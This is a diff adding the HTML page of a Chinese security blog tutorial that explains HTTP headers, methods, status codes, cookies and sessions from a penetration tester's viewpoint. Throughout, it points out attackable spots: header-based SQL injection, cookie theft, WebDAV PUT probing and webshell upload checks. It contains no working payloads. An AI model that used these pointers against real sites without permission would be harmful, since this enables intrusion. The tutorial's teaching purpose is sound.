@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="从入侵者的眼中去理解 http 协议"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>从入侵者的眼中去理解 http 协议 - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/06/18/http-basic/">
+                从入侵者的眼中去理解 http 协议
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-06-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http/">http</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;不管对于web开发亦或是渗透来讲,熟练掌握http协议的核心运作要点都是入门必备科目,如果连这些最基础的东西都没掌握熟练,又何谈下一步呢,因为http会贯穿于后续整个web渗透过程,当然啦,就http协议本身来讲,还是非常非常复杂的,单单靠一篇文章就想全面透彻的掌握http协议,毕竟不太现实,所以我们今天也只是模拟站在一个专业入侵者的角度上来重新理解http协议最核心的一些点,中间也会穿插着说明这些点容易带来的一些安全问题,如果大家真的非常有兴趣,想继续深入学习http协议,建议参考 《http权威指南》,着实是本http方面的好书,起码,个人是这样觉得的,既然是说协议,也就意味着某些东西可能会有些抽象,不过大家不用担心,我会用尽量用最容易理解的方式把它说明白,废话到此为止,咱们开始</p>
+<p>0x02 初始 http 简要工作过程<br>&nbsp;&nbsp;客户端向web服务器请求所指定的资源(request)  =&gt; web服务器(默认端口通常为80,8080)<br>&nbsp;&nbsp;web服务器响应给客户端所请求的对应的资源数据(response) =&gt; 客户端(随机端口和目标web服务端口进行连接)<br>&nbsp;&nbsp;简单来讲,http就是一套用来规定”请求(request)”和”响应(response)”的规范,以此来保证客户端和服务端能够正常的进行通信<br>&nbsp;&nbsp;用白话来讲 <font size="3" color="red">客户端向服务器端请求,然后服务器端把被请求的东西交给客户端</font> 这就算一次完整的http通信<br><a id="more"></a><br>0x03 理解http最基础的一些特性<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">简洁快速: 客户端只需要传输具体的 <span class="string">"请求方法"</span> 和要请求的 <span class="string">"资源路径"</span>,服务器便可根据此快速把数据响应给客户端</div><div class="line">灵  活:   <span class="keyword">http</span> 几乎可以传输 <span class="string">"任意类型"</span> 的数据[支持什么样的类型都是被定义在MIME中的],比如:文本,视频,图片,压缩包,二进制程序等等……</div><div class="line">无连接:   每次连接只处理一个请求,服务器处理完请求并收到客户端正确应答后,即立刻断开连接,这样可以大大的节省传输时间</div><div class="line">无状态:   其实,说白点,就是客户端和服务器之间的每个连接都是相互独立的,彼此并不知道彼此的存在,所以,每个连接并不能相互依赖或者在彼此上附加数据,比如:</div><div class="line"> 	  一个连接的数据没有处理完,那么它就必须再重新传,而不能继续再<span class="string">'断点'</span>上累加,也就是所谓的 <span class="string">"http是无记忆的"</span>,不过在 <span class="keyword">http</span> <span class="number">1.1</span> 会保持一个tcp连接</div></pre></td></tr></table></figure></p>
+<p>0x04 需要熟记的一些http请求头字段作用 [因为请求头对于我们来讲是可控的,所以针对http的利用大多也都集中在请求头中] :<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http请求方法[常用的GET,POST,HEAD]  所请求的资源在服务器上的位置  所使用的http协议版本(<span class="number">1.1</span>/<span class="number">1.0</span>)</div><div class="line">POST  /drupal/?q=<span class="keyword">node</span><span class="title">&amp;destination</span>=<span class="keyword">node</span>  <span class="title">HTTP</span>/<span class="number">1.1</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">指明<span class="selector-tag">host</span>请求头<span class="selector-attr">[如果使用 http 1.1版本 必须指定该字段,它通常是目标域名,比如,如果有多个虚拟主机,我们就必须指定不同的域名才能访问到不同的网站目录]</span></div><div class="line"><span class="selector-tag">Host</span>: <span class="selector-tag">www</span><span class="selector-class">.target</span><span class="selector-class">.org</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">客户端操作系统和浏览器版本信息 [ 如果你是用浏览器发起的http请求,默认就会加上这些东西 ]</div><div class="line">有些网站为了记录用户信息,可能会把这这儿的数据也一并记录到数据库中,最后可能会导致的结果就是,脚本在数据库中<span class="keyword">select</span>这些数据的时候难免会被注入</div><div class="line"><span class="keyword">User</span>-<span class="keyword">Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">6.1</span>; rv:48.0) Gecko/20100101 Firefox/48.0</div></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">告诉服务器端,客户端可以接收那些格式的内容,下面表示可以接收html或xml文件</div><div class="line">Accept: <span class="built_in">text</span>/html,<span class="built_in">application</span>/xhtml+xml,<span class="built_in">application</span>/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></div></pre></td></tr></table></figure>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">告诉服务器端,客户端所支持的语言环境,有很多带有多语言切换的国际版网站[如携程]很有可能就会根据此字段来判断客户端的语言环境,然后再返回对应语言的页面</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,<span class="keyword">en</span>-<span class="keyword">US</span>;q=0.5,<span class="keyword">en</span>;q=0.3</div></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">告诉服务器端客户端支持哪种压缩方式,默认都是gzip,加快传输速度,不压缩服务器会直接返回文本,如果数据量比较大,可能会响应很慢,所以默认都会压缩再传输</div><div class="line"><span class="keyword">Accept</span>-Encoding: gzip, deflate[压缩算法]</div><div class="line"><span class="keyword">Accept</span>-Charset:   有时候你还会在请求头中看到这样的字段,它是用来指定客户端所支持的字符集</div></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">记录到达该页面的上一个url地址,这也是请求头中经常会被利用的一个字段,有时候程序也会把这个记录到数据库中,方便后续判断,同样的问题select的时候容易被注入</div><div class="line"><span class="string">Referer:</span> <span class="string">http:</span><span class="comment">//192.168.3.21/drupal/</span></div></pre></td></tr></table></figure>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">很多web程序都会基于此字段把客户端的真实<span class="built_in">ip</span>入库,还是一样问题,入库不免又要<span class="keyword">select,也就意味着可能被注入</span></div><div class="line"><span class="symbol">x_forwarded_for</span></div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">请求头中cookie信息,很显然,这里的cookie是没有任何参数的,有时候服务器端会把一些敏感参数都写到客户端cookie中做验证</div><div class="line">尤其是一些带有用户功能的站点,cookie可能还包含了很多其他的参数</div><div class="line">比如一些商城,论坛类的程序,既然cookie里面有动态参数,那我们不妨就针对这些参数下手,如,sql注入,cookie盗取伪造登录<span class="built_in">..</span>.</div><div class="line">当然,关于cookie自身的属性还有很多,下面会再单独说,这里暂时先有个影响就好</div><div class="line">Cookie: <span class="attribute">PHPSESSID</span>=27112bba201d8add0ebbbf8dcdd2bde8; <span class="attribute">security_level</span>=0; <span class="attribute">has_js</span>=1</div></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">告诉服务器端,在完成客户端响应后先不要立马关闭当前tcp连接,<span class="built_in">close</span>表示立即关闭,而KeepAlive的意思就是保持连接 [有规定时长,超过会自动断开]</div><div class="line">Connection: <span class="built_in">close</span></div></pre></td></tr></table></figure>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">指定消息主体中的内容类型,如,用url编码...</div><div class="line">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</div></pre></td></tr></table></figure>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">消息主体的内容长度,单位字节</div><div class="line"><span class="attribute">Content-Length</span>: 119</div></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">指明到达当前页面的原始位置在哪里,这也是个比较重要的字段,后续单独说明</div><div class="line"><span class="symbol">origin:</span></div></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http内置身份验证,向服务器端提交认证证书</div><div class="line"><span class="symbol">authorization:</span></div></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">如果你想,多线程下载或者断点续传可以在请求头中加上该字段</div><div class="line"><span class="keyword">range</span>:</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">注意,这里还有个空格</div></pre></td></tr></table></figure>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST消息主体[如果是GET请求,是没有消息主体的,它的参数都直接是放到url中传的],和get中的参数一样,一个key对应一个values</div><div class="line"><span class="keyword">name</span>=admin&amp;<span class="keyword">pass</span>=admin&amp;form_build_id=<span class="keyword">form</span>-s6S30NYh20X2pmy-P7R9ybb2fBLkfWlXzosu85DYtn4&amp;form_id=user_login_block&amp;op=<span class="built_in">Log</span>+<span class="keyword">in</span></div></pre></td></tr></table></figure>
+<p>0x05 需要熟记的一些http请求方法:<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET     向服务器请求url中所标识的资源,有时候还会在要请求的资源上附带一些参数,供脚本到后端数据库去增删改查</div><div class="line">POST    在向服务器请求资源的同时附加一些新的数据在消息主体中</div><div class="line">	常用于各种大数据表单提交,比如:上传,登录/注册,留言板,凡是有大量数据提交的地方基本都会用到</div><div class="line">HEAD    只返回响应头部,不返回主体的html数据</div><div class="line">PUT     尝试向服务器请求存储一个指定资源,如,经典的webdav 写漏洞</div><div class="line">MOVE	向服务器请求移动某个资源</div><div class="line"><span class="keyword">COPY</span><span class="bash">	向服务器请求拷贝某个资源</span></div><div class="line">DELETE  向服务器请求删除url所指定的资源</div><div class="line">OPTIONS 通过此方法可帮助我们查询服务器支持哪些请求方法</div><div class="line">	通常,我们可以直接用这种方式来探测目标服务器是否支持一些高危方法 例如:put,delete,move,<span class="keyword">copy</span><span class="bash"></span></div></pre></td></tr></table></figure></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">下面是通过OPTIONS方法获取到的服务器响应结果:</div><div class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</div><div class="line"><span class="string">Date:</span> Thu, <span class="number">23</span> Jun <span class="number">2016</span> <span class="number">07</span>:<span class="number">31</span>:<span class="number">08</span> GMT</div><div class="line"><span class="string">Server:</span> Microsoft-IIS/<span class="number">6.0</span></div><div class="line">X-Powered-<span class="string">By:</span> ASP.NET</div><div class="line">MS-Author-<span class="string">Via:</span> DAV</div><div class="line">Content-<span class="string">Length:</span> <span class="number">0</span></div><div class="line">Accept-<span class="string">Ranges:</span> none</div><div class="line"><span class="string">DASL:</span> &lt;<span class="string">DAV:</span>sql&gt;</div><div class="line"><span class="string">DAV:</span> <span class="number">1</span>, <span class="number">2</span></div><div class="line"><span class="string">Public:</span> OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</div><div class="line"><span class="string">Allow:</span> OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK</div><div class="line">Cache-<span class="string">Control:</span> <span class="keyword">private</span></div></pre></td></tr></table></figure>
+<p>0x06 需要熟记的一些http响应头字段作用[对于响应头,我们可以直接利用的并不多,除了获取一些敏感信息外,别的暂时可能对我们实际作用并不是特别大]<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">响应的http版本号  响应的状态码 </div><div class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</div></pre></td></tr></table></figure></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务器端时间</div><div class="line"><span class="selector-tag">Date</span>: <span class="selector-tag">Fri</span>, 17 <span class="selector-tag">Mar</span> 2017 12<span class="selector-pseudo">:36</span><span class="selector-pseudo">:26</span> <span class="selector-tag">GMT</span></div></pre></td></tr></table></figure>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">web服务器版本信息,比如,针对各种web服务器的解析漏洞利用,就需要事先知道明确的web服务器版本类型及其对应的详细版本号,然后再针对性的尝试利用</div><div class="line">以apache和nginx为例,很多人为了安全起见,在编译安装就会在源码中把这些版本特征都改掉,或者在安装后通过修改配置文件把这些版本信息都隐藏掉</div><div class="line"><span class="string">Server:</span> Apache<span class="regexp">/2.2.8 (Ubuntu) DAV/</span><span class="number">2</span> mod_fastcgi<span class="regexp">/2.4.6 PHP/</span><span class="number">5.2</span><span class="number">.4</span><span class="number">-2</span>ubuntu5 with Suhosin-Patch mod_ssl<span class="regexp">/2.2.8 OpenSSL/</span><span class="number">0.9</span><span class="number">.8</span>g</div></pre></td></tr></table></figure>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">web</span>服务器端脚本信息,就php而言,不同的版本,一些漏洞的利用方法也是不一样的</div><div class="line">X-Powered-<span class="keyword">By: </span>PHP/<span class="number">5</span>.<span class="number">2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">是否缓存到浏览器</div><div class="line"><span class="keyword">Cache</span>-Control: <span class="keyword">no</span>-<span class="keyword">cache</span>, must-revalidate, post-<span class="keyword">check</span>=<span class="number">0</span>, pre-<span class="keyword">check</span>=<span class="number">0</span></div></pre></td></tr></table></figure>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">向客户端浏览器设置cookie,第一次设置完成后,后续客户端再来访问服务器会一直带着这个cookie</div><div class="line"><span class="keyword">set</span>-cookie：</div></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">P3P头主要用来保护用户隐私</div><div class="line"><span class="symbol">P3P:</span> <span class="keyword">CP</span>=<span class="string">" OTI DSP COR IVA OUR IND COM "</span></div></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">表示是否允许通过跨域ajax请求获取资源</div><div class="line"><span class="keyword">access</span>-control-allow-origin</div></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">服务器可以通过此字段告诉浏览器定时刷新页面,用的非常少</div><div class="line"><span class="symbol">refresh:</span></div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">指定消息主体内容的缓存过期时间</div><div class="line"><span class="selector-tag">Expires</span>: <span class="selector-tag">Sun</span>, 19 <span class="selector-tag">Nov</span> 1978 05<span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span> <span class="selector-tag">GMT</span></div></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">告诉浏览器该资源的最后修改时间</div><div class="line"><span class="selector-tag">Last-Modified</span>: <span class="selector-tag">Fri</span>, 17 <span class="selector-tag">Mar</span> 2017 12<span class="selector-pseudo">:36</span><span class="selector-pseudo">:26</span> +0000</div></pre></td></tr></table></figure>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">响应消息主体的语言,这还要看客户端请求头中的语言是什么</div><div class="line">Content-<span class="keyword">Language</span>: en</div></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">用于重定该响应,在php中有个header()函数和此功能类似</div><div class="line"><span class="symbol">location:</span> 指定要跳转到的地址</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">响应完成后是否立马关闭当前tcp连接</div><div class="line">Connection: close</div><div class="line">Keep-Alive: <span class="attribute">timeout</span>=5, <span class="attribute">max</span>=100</div></pre></td></tr></table></figure>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">消息主体内容的格式和字符集</div><div class="line">Content-Type: text/html; <span class="attribute">charset</span>=utf-8</div></pre></td></tr></table></figure>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">响应消息主体内容的长度,单位字节</div><div class="line"><span class="attribute">Content-Length</span>: 8114</div></pre></td></tr></table></figure>
+<p>0x07 需要熟记的一些 http 响应状态码<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="number">200</span> 表示客户端请求提交成功,并且服务端正常响应数据</div><div class="line">    比如:我们在成功上传webshell以后,会直接去访问url,根据返回,来判断<span class="keyword">shell</span><span class="bash">是否执行成功,一般看下响应头就可以了,成功即返回200,如果被限制执行则可能会返回403</span></div><div class="line"><span class="number">201</span> 一般用put方法,成功在服务器端创建文件后都会返回这个状态码</div><div class="line"><span class="number">301</span> 请求的资源被找到,永久性的将请求重定向到location所指定的url上,后面的所有请求都将被重定向</div><div class="line"><span class="number">302</span> 请求的资源被找到,只是暂时性的将请求重定向到localtion所指定的url上,随后的请求将不再重定向</div><div class="line"><span class="number">400</span> 客户端提交了一个无效的http请求</div><div class="line"><span class="number">401</span> 表示你访问所请求的资源之前需要http身份验证,认证通过后才能访问该资源</div><div class="line"><span class="number">403</span> 禁止任何人访问该资源,有时候我们在盲打后台或者尝试注入的时候可能就会遇到这样的状态码,多半是因为禁止目录遍历或者waf拦截,再或者就是web端做了一些敏感检测策略[如,nginx配置就相当灵活,完全可以自定义返回状态码]</div><div class="line"><span class="number">404</span> 表示所请求的资源在服务器上不存在</div><div class="line"><span class="number">405</span> 当服务器不支持所请求的方法,一般都会返回这个状态码 例如:put <span class="keyword">copy</span><span class="bash"> move delete</span></div><div class="line"><span class="number">413</span> 有时候在测试缓冲区溢出时会返回此状态码</div><div class="line"><span class="number">500</span> 请求的资源在服务器端执行出错,比如,在请求时加了一些特殊字符,或者服务端脚本自身的语法出错,都会导致<span class="number">500</span></div><div class="line"><span class="number">502</span> 一般是由于网站连接过多,服务器暂时无法正常响应造成的</div><div class="line"><span class="number">503</span> 虽然web服务器运转正常,但后端的脚本程序无法做出响应</div></pre></td></tr></table></figure></p>
+<p>0x08 什么是 cookie<br>&nbsp;&nbsp;&nbsp;&nbsp;除了正常的GET或者POST传参之外,cookie属于另一种传参方式,它无需用户或者应用干预,客户端和服务器的每次请求响应都会带上该cookie,需要注意的是,cookie是存在客户端浏览器的缓存或者硬盘上的临时文件中的，对于cookie中的一些敏感参数[如,账号密码…],一般都设有过期时间[过期会自动删除],当然你也可以手动删除,核心在于它是放在客户端的[导致可控],有可能就会造成泄露</p>
+<p>需要了解的几个常见的cookie内置属性:<br><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">expires： 	指定cookie过期时间</div><div class="line"><span class="symbol">domain:</span>   	指定cookie有效作用域</div><div class="line"><span class="symbol">path:</span>   	指定cookie有效的url</div><div class="line"><span class="symbol">secure:</span>  	用于在https中提交的cookie</div><div class="line"><span class="symbol">httponly:</span> 	设置此属性以后,可以一定程度上防止js直接读取cookie数据,现在为了防止cookie被盗,一般都会加上此字段,不过上次偶然看了一篇可以绕过httponly的文章,后续再单独说</div></pre></td></tr></table></figure></p>
+<p>0x09 session 又是什么东西呢<br>&nbsp;&nbsp;&nbsp;&nbsp;由于http无状态,要想在服务器端标示跟踪每个不同的用户身份,我们就需要利用到session[其实就是cookie中的PHPSEESSIONID,作为用户唯一标示],比如,我们在写一些商城程序时,购物车中的数据都会被暂时写到session中,而session是被放在服务器端的[一般是/tmp目录下],导致用户不可控,相对安全一些,如果一个session长时间没有动作或者你突然关闭了浏览器,服务器会自动回收并销毁对应的sessionid,实际开发中,一般cookie和session都是相互配置使用的</p>
+<p>0x10 GET 和 POST 的区别<br><figure class="highlight qml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GET  直接把参数放在<span class="built_in">url</span>中传递,所以在<span class="built_in">url</span>中可以看得到</div><div class="line">POST 把数据附加在http消息主体里面进行传递,在<span class="built_in">url</span>中是不可见的</div></pre></td></tr></table></figure></p>
+<p>注意:它们都有数据长度的限制,但这个并不是http协议本身的限制,它的长度还是取决于当前的操作系统和浏览器,有些漏洞的利用可能会用到这种特性,如,超长截断的问题,不仅仅在web脚本中会出现,数据库也同样会出现类似的问题</p>
+<p>0x11 关于伪静态的( url重写 )问题<br>&nbsp;&nbsp;&nbsp;&nbsp;本质就是利用正则,隐藏动态参数,加大外部攻击指定参数的难度,但这样做的主要目的还是为了更利于搜搜引擎抓取,提高用户体验,不过,在猜出对方正则的情况下,还是可以利用本地中转的方式进行检测</p>
+<p>0x12 http 正向及反向代理</p>
+<p>正向代理<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候我们会遇到这样的情况,我们自己没法正常访问目标网站,但我们有一台可以正常访问目标网站,的机器,然后你可以把自己本地的代理改成那台机器的ip和指定端口,这样我们就可以通过那台机器来访问目标站了,主要还是数据流向</p>
+<p>反向代理:<br>&nbsp;&nbsp;&nbsp;&nbsp;最典型的应用可能就是ngnix了,当你去访问一比较大的电商站时[如,jd,当当],请求其实会先到达代理服务器,然后由代理服务器来分发给后台的其他web服务器处理,至于如何分发则由其内部的负载均衡算法决定,理解数据流向就好,关于架构后续有机会再单独说</p>
+<p>0x13 了解完 http 最重要的内容以后,我们再来简单认识下,什么是 URL 和 URI<br>URI[统一资源标识符]作用:<br>&nbsp;&nbsp;&nbsp;&nbsp;其实,就是专门用来标示互联网上所有计算机资源的字符串,当然这些资源不仅仅包括,文档,图像,视频,二进制程序……别人只需通过某种指定的协议以及资源所存放的主机名[ip或域名],资源自身的名称,资源在该主机下的具体路径就可以访问到该资源,所以互联网上的一切计算机资源都可以被称作URI,因此它所表示的范围非常大</p>
+<p>例如:下面这些,它们都算URI<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//www.klionsec.org/detail.php?id=12&amp;action=upload </span></div><div class="line"><span class="params">&lt;a href=mailto:klion@china.net&gt;</span>测试邮件<span class="params">&lt;/a&gt;</span></div></pre></td></tr></table></figure></p>
+<p>URL[统一资源定位符]作用:<br>&nbsp;&nbsp;&nbsp;&nbsp;只是用来唯一的标识某台计算机上的某个资源,它所能代表的范围相对比较小,URL只是URI的一部分或者说子集,也可以这么说每个URL肯定都是URI</p>
+<p>URL的必要组成部分:<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">访问这个资源时所使用的协议: <span class="comment">//主机名[一般是域名或者IP]:按规定好的端口去访问这个资源/具体的资源路径</span></div></pre></td></tr></table></figure></p>
